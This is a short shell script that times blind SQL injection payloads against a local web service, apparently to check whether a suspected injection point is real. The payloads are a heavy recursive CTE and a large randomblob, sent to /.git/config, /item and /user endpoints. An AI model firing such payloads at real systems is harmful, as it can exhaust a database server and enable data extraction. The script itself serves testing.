H='http://127.0.0.1:8897'
CTE='1%20AND%201=(WITH%20RECURSIVE%20c(x)%20AS%20(SELECT%201%20UNION%20ALL%20SELECT%20x+1%20FROM%20c%20WHERE%20x%3C100000000)%20SELECT%20max(x)%20FROM%20c)'
RB='1%20AND%20randomblob(900000000)%20IS%20NOT%20NULL'
tm(){ for i in 1 2 3; do curl -s -o /dev/null -w "%{time_total} " "$1"; done; echo " <= $1"; }
tm "$H/.git/config"
tm "$H/.git/config?p=$CTE"
tm "$H/.git/config?p=$RB"
tm "$H/.git/config?p=1'"
echo "--- controls on real sink"
tm "$H/item?id=1"
tm "$H/item?id=$CTE"
tm "$H/user?id=1"
tm "$H/user?id=$RB"
